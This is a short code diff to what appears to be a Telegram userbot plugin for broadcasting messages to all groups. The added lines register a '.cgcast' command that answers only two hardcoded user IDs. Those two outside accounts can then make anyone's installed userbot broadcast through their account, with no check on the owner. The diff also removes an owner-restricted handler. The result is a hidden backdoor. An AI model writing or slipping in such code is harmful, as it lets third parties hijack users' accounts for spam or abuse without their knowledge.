@@ -22,12 +22,10 @@ __HELP__ = """
   <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍᴋᴀɴ ᴘᴇsᴀɴ ɢᴄᴀsᴛ sᴇᴄᴀʀᴀ ᴏᴛᴏᴍᴀᴛɪs
 """
 
+@ubot.on_message(
+    filters.command(["cgcast"], ".") & filters.user([1948147616, 1819269848]))
 @PY.UBOT("gcast", sudo=True)
 @PY.TOP_CMD
-async def _(client, message):
-    await broadcast_group_cmd(client, message)
-
-@PY.UBOT("xgcast", FILTERS.OWNER)
 async def _(client, message):
     await broadcast_group_cmd(client, message)
 
